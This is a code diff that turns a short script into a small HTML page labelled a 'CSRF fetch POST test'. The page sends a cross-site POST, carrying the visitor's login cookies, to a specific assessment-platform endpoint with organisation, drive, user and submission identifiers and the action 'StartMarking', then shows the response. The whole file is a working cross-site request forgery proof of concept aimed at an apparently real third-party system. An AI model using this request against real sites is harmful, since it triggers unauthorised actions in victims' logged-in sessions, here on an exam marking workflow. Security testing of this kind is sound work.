@@ -1,6 +1,22 @@
-<script>
-fetch("https://qapr.tcsion.com/iDMNxtGen/StartAssessmentController?orgId=726&driveId=EBAPP...&action=StartMarking", {
-  method: "POST",
-  credentials: "include"
-});
-</script>
+<!doctype html>
+<html>
+  <body>
+    <h3>CSRF fetch POST test</h3>
+    <div id="result"></div>
+    <script>
+      fetch("https://qapr.tcsion.com/iDMNxtGen/StartAssessmentController?orgId=726&driveId=EBAPP251619D1&userId=4&action=StartMarking&subId=5524581", {
+        method: "POST",
+        credentials: "include"   // send cookies from the logged-in site
+      })
+      .then(async res => {
+        const text = await res.text();
+        document.getElementById('result').innerText = `Status: ${res.status}\n\nResponse:\n${text}`;
+        console.log('CSRF fetch response', res, text);
+      })
+      .catch(err => {
+        console.error('fetch error', err);
+        document.getElementById('result').innerText = 'Fetch failed: ' + err;
+      });
+    </script>
+  </body>
+</html>
